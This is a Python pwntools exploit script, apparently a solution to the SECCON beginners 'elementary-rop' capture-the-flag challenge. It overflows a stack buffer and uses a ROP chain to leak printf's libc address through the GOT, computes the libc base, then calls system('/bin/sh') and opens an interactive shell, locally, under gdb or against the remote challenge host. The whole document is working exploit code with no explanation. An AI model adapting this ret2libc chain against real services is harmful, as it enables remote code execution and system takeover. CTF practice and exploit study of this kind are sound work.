#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall_patched"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("elementary-rop.beginners.seccon.games", 9003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+51
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


rop_pop_rdi_ret = 0x0040115a
rop_ret = 0x004011ec

payload = b"A" * 0x28
payload += p64(rop_ret)
payload += p64(rop_pop_rdi_ret)
payload += p64(elf.got['printf'])
payload += p64(elf.plt['printf'])
payload += p64(elf.symbols['main'] + 1)

p.recvuntil(":")
p.sendline(payload)

p.recvuntil('\x20')
leak = u64(p.recv(6) + b'\0' * 2)
log.info("printf@libc: " + hex(leak))
libc_base = leak - libc.symbols['printf']
log.info("libc base: " + hex(libc_base))
libc.address = libc_base
log.info("system@libc: " + hex(libc.symbols["system"]))

binsh_addr = next(libc.search(b'/bin/sh\x00'))
log.info("/bin/sh: " + hex(binsh_addr))


payload = b"B" * 0x28
payload += p64(rop_ret)
payload += p64(rop_pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(libc.symbols["system"])

p.recvuntil(":")
p.sendline(payload)


p.interactive()
